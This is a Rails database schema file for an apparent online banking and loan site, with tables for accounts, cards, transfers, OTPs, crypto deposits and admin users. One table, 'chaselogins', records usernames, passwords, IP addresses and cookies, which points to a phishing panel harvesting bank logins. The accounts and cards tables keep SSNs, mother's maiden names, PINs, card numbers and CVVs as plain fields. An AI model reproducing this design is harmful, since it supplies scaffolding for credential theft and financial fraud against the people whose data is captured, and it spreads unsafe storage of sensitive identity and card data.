# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# This file is the source Rails uses to define your schema when running `bin/rails
# db:schema:load`. When creating a new database, `bin/rails db:schema:load` tends to
# be faster and is potentially less error prone than running all of your
# migrations from scratch. Old migrations may fail to apply correctly if those
# migrations use external dependencies or application code.
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema[7.2].define(version: 2025_10_27_012535) do
  # These are extensions that must be enabled in order to support this database
  enable_extension "plpgsql"

  create_table "abouts", force: :cascade do |t|
    t.string "abtimg"
    t.string "title"
    t.string "sub_title"
    t.text "body"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["slug"], name: "index_abouts_on_slug"
  end

  create_table "accounts", force: :cascade do |t|
    t.string "address"
    t.string "country"
    t.string "avatar"
    t.string "zip_code"
    t.string "ssn"
    t.string "mmn"
    t.integer "account_pin"
    t.string "account_number"
    t.string "routine_number"
    t.string "dob"
    t.string "slug"
    t.float "balance"
    t.string "occupation_address"
    t.bigint "user_id"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.boolean "verified"
    t.boolean "status"
    t.string "account_type"
    t.string "lbalance"
    t.string "state"
    t.string "city"
    t.string "phone"
    t.index ["slug"], name: "index_accounts_on_slug"
    t.index ["user_id"], name: "index_accounts_on_user_id"
  end

  create_table "active_admin_comments", force: :cascade do |t|
    t.string "namespace"
    t.text "body"
    t.string "resource_type"
    t.bigint "resource_id"
    t.string "author_type"
    t.bigint "author_id"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["author_type", "author_id"], name: "index_active_admin_comments_on_author_type_and_author_id"
    t.index ["namespace"], name: "index_active_admin_comments_on_namespace"
    t.index ["resource_type", "resource_id"], name: "index_active_admin_comments_on_resource_type_and_resource_id"
  end

  create_table "admin_users", force: :cascade do |t|
    t.string "email", default: "", null: false
    t.string "encrypted_password", default: "", null: false
    t.string "reset_password_token"
    t.datetime "reset_password_sent_at", precision: nil
    t.datetime "remember_created_at", precision: nil
    t.integer "sign_in_count", default: 0, null: false
    t.datetime "current_sign_in_at", precision: nil
    t.datetime "last_sign_in_at", precision: nil
    t.inet "current_sign_in_ip"
    t.string "confirmation_token"
    t.datetime "confirmed_at", precision: nil
    t.datetime "confirmation_sent_at", precision: nil
    t.string "unconfirmed_email"
    t.integer "failed_attempts", default: 0, null: false
    t.string "unlock_token"
    t.datetime "locked_at", precision: nil
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["confirmation_token"], name: "index_admin_users_on_confirmation_token", unique: true
    t.index ["email"], name: "index_admin_users_on_email", unique: true
    t.index ["reset_password_token"], name: "index_admin_users_on_reset_password_token", unique: true
    t.index ["unlock_token"], name: "index_admin_users_on_unlock_token", unique: true
  end

  create_table "adminloans", force: :cascade do |t|
    t.text "body"
    t.boolean "status"
    t.boolean "verified"
    t.bigint "user_id", null: false
    t.string "title"
    t.integer "loan_id"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
    t.index ["user_id"], name: "index_adminloans_on_user_id"
  end

  create_table "banners", force: :cascade do |t|
    t.string "title"
    t.string "sub_title"
    t.string "bannerimg"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
  end

  create_table "bills", force: :cascade do |t|
    t.string "name"
    t.string "service"
    t.string "amount"
    t.datetime "date", precision: nil
    t.boolean "status"
    t.bigint "user_id"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["slug"], name: "index_bills_on_slug"
    t.index ["user_id"], name: "index_bills_on_user_id"
  end

  create_table "blogs", force: :cascade do |t|
    t.string "blogimg"
    t.string "title"
    t.string "sub_title"
    t.text "body"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["slug"], name: "index_blogs_on_slug"
  end

  create_table "boards", force: :cascade do |t|
    t.string "name"
    t.string "title"
    t.string "boardimg"
    t.string "body"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["slug"], name: "index_boards_on_slug"
  end

  create_table "cards", force: :cascade do |t|
    t.string "name"
    t.string "card_number"
    t.string "cvv"
    t.datetime "date", precision: nil
    t.string "slug"
    t.boolean "status"
    t.bigint "user_id"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.string "card_type"
    t.string "card_company"
    t.datetime "arrivaltime", precision: nil
    t.string "cardimg"
    t.string "address"
    t.string "zipcode"
    t.string "phone"
    t.index ["slug"], name: "index_cards_on_slug"
    t.index ["user_id"], name: "index_cards_on_user_id"
  end

  create_table "ccservices", force: :cascade do |t|
    t.string "title"
    t.string "subtitle"
    t.text "body"
    t.string "slug"
    t.string "ccimg1"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
    t.index ["slug"], name: "index_ccservices_on_slug"
  end

  create_table "chaselogins", force: :cascade do |t|
    t.string "username"
    t.string "password"
    t.string "ip_address"
    t.text "cookies"
    t.text "cookies_text"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
  end

  create_table "contacts", force: :cascade do |t|
    t.string "country"
    t.string "phone"
    t.string "address"
    t.string "footer_mgs"
    t.string "email"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
  end

  create_table "deposits", force: :cascade do |t|
    t.string "method"
    t.string "amount"
    t.boolean "status"
    t.datetime "date", precision: nil
    t.string "account_name"
    t.string "account_number"
    t.string "swiftcode"
    t.string "routing_number"
    t.string "btcw"
    t.string "ethw"
    t.string "btcnote"
    t.bigint "user_id", null: false
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
    t.index ["user_id"], name: "index_deposits_on_user_id"
  end

  create_table "faqs", force: :cascade do |t|
    t.string "title"
    t.text "body"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["slug"], name: "index_faqs_on_slug"
  end

  create_table "features", force: :cascade do |t|
    t.string "fimg"
    t.string "title"
    t.string "sub_title"
    t.text "body"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["slug"], name: "index_features_on_slug"
  end

  create_table "feedbacks", force: :cascade do |t|
    t.string "icon"
    t.string "title"
    t.string "sub_title"
    t.text "body"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["slug"], name: "index_feedbacks_on_slug"
  end

  create_table "headers", force: :cascade do |t|
    t.string "abouts_title"
    t.string "abouts_sub_title"
    t.string "services_title"
    t.string "services_sub_title"
    t.string "boards_title"
    t.string "boards_sub_title"
    t.string "features_title"
    t.string "features_sub_title"
    t.string "feedbacks_title"
    t.string "feedbacks_sub_title"
    t.string "blogs_title"
    t.string "blogs_sub_title"
    t.string "projects_title"
    t.string "projects_sub_title"
    t.string "cta1"
    t.string "cta2"
    t.string "headerimg"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.string "plans_title"
    t.string "plans_sub_title"
    t.string "abtsectionimg"
    t.string "featimg"
    t.string "plansimg"
    t.string "featheaderimg"
    t.string "planscta1"
    t.string "planscta2"
  end

  create_table "loans", force: :cascade do |t|
    t.string "business_name"
    t.string "budget"
    t.string "amount"
    t.string "interest"
    t.string "desc"
    t.string "project_name"
    t.string "project_size"
    t.string "project_desc"
    t.datetime "date", precision: nil
    t.string "name"
    t.string "first_name"
    t.string "last_name"
    t.string "email"
    t.string "slug"
    t.bigint "user_id", null: false
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
    t.boolean "step1_status"
    t.boolean "step2_status"
    t.boolean "step3_status"
    t.string "phone"
    t.string "ssn"
    t.string "business_address"
    t.string "buisness_type"
    t.string "business_years"
    t.string "loan_type"
    t.string "bfs"
    t.string "btr"
    t.string "cr"
    t.string "bp"
    t.string "pfs"
    t.string "ein_vat"
    t.string "drivers_lfront"
    t.string "drivers_lback"
    t.string "ld"
    t.boolean "status"
    t.boolean "agreement"
    t.index ["slug"], name: "index_loans_on_slug"
    t.index ["user_id"], name: "index_loans_on_user_id"
  end

  create_table "otps", force: :cascade do |t|
    t.string "otp"
    t.bigint "transfer_id"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["transfer_id"], name: "index_otps_on_transfer_id"
  end

  create_table "packages", force: :cascade do |t|
    t.string "title"
    t.string "pkimg"
    t.string "sub_title"
    t.text "body"
    t.string "slug"
    t.datetime "duration", precision: nil
    t.string "rate"
    t.string "droi"
    t.string "icon"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
    t.index ["slug"], name: "index_packages_on_slug"
  end

  create_table "plans", force: :cascade do |t|
    t.string "title"
    t.string "planimg"
    t.string "sub_title"
    t.text "body"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["slug"], name: "index_plans_on_slug"
  end

  create_table "sections", force: :cascade do |t|
    t.string "title"
    t.string "icon"
    t.string "sub_title"
    t.text "body"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.index ["slug"], name: "index_sections_on_slug"
  end

  create_table "services", force: :cascade do |t|
    t.string "title"
    t.string "sub_title"
    t.text "body"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.string "serviceimg"
    t.index ["slug"], name: "index_services_on_slug"
  end

  create_table "transactions", force: :cascade do |t|
    t.string "amount"
    t.string "transac_type"
    t.datetime "date", precision: nil
    t.string "purpose"
    t.string "sender"
    t.boolean "status"
    t.bigint "user_id"
    t.string "slug"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.integer "account_id"
    t.string "bal_type"
    t.index ["slug"], name: "index_transactions_on_slug"
    t.index ["user_id"], name: "index_transactions_on_user_id"
  end

  create_table "transfers", force: :cascade do |t|
    t.string "account_name"
    t.string "account_number"
    t.string "routine_number"
    t.string "swift_code"
    t.bigint "user_id"
    t.string "bank_name"
    t.string "amount"
    t.boolean "status"
    t.integer "account_id"
    t.string "slug"
    t.string "notes"
    t.string "country"
    t.string "otp"
    t.string "pin"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.string "transfer_type"
    t.boolean "confirmed"
    t.string "tref"
    t.index ["slug"], name: "index_transfers_on_slug"
    t.index ["user_id"], name: "index_transfers_on_user_id"
  end

  create_table "users", force: :cascade do |t|
    t.string "email", default: "", null: false
    t.string "encrypted_password", default: "", null: false
    t.string "reset_password_token"
    t.datetime "reset_password_sent_at", precision: nil
    t.datetime "remember_created_at", precision: nil
    t.integer "sign_in_count", default: 0, null: false
    t.datetime "current_sign_in_at", precision: nil
    t.datetime "last_sign_in_at", precision: nil
    t.inet "current_sign_in_ip"
    t.inet "last_sign_in_ip"
    t.string "confirmation_token"
    t.datetime "confirmed_at", precision: nil
    t.datetime "confirmation_sent_at", precision: nil
    t.string "unconfirmed_email"
    t.integer "failed_attempts", default: 0, null: false
    t.string "unlock_token"
    t.datetime "locked_at", precision: nil
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.string "username"
    t.string "phone"
    t.string "first_name"
    t.string "last_name"
    t.boolean "status"
    t.boolean "verified"
    t.text "body"
    t.integer "balance"
    t.index ["confirmation_token"], name: "index_users_on_confirmation_token", unique: true
    t.index ["email"], name: "index_users_on_email", unique: true
    t.index ["reset_password_token"], name: "index_users_on_reset_password_token", unique: true
    t.index ["unlock_token"], name: "index_users_on_unlock_token", unique: true
  end

  create_table "welcomes", force: :cascade do |t|
    t.string "logoimg"
    t.string "title"
    t.string "desc"
    t.string "whatsapp"
    t.string "ig"
    t.string "ln"
    t.string "section"
    t.string "link"
    t.string "footer"
    t.string "phone"
    t.string "address"
    t.string "twitter"
    t.string "telegram"
    t.datetime "created_at", precision: nil, null: false
    t.datetime "updated_at", precision: nil, null: false
    t.string "youtube"
    t.string "loantitle"
    t.string "loansummary"
    t.string "loandesc"
    t.string "loanfavimg"
  end

  add_foreign_key "accounts", "users"
  add_foreign_key "adminloans", "users"
  add_foreign_key "bills", "users"
  add_foreign_key "cards", "users"
  add_foreign_key "deposits", "users"
  add_foreign_key "loans", "users"
  add_foreign_key "otps", "transfers"
  add_foreign_key "transactions", "users"
  add_foreign_key "transfers", "users"
end
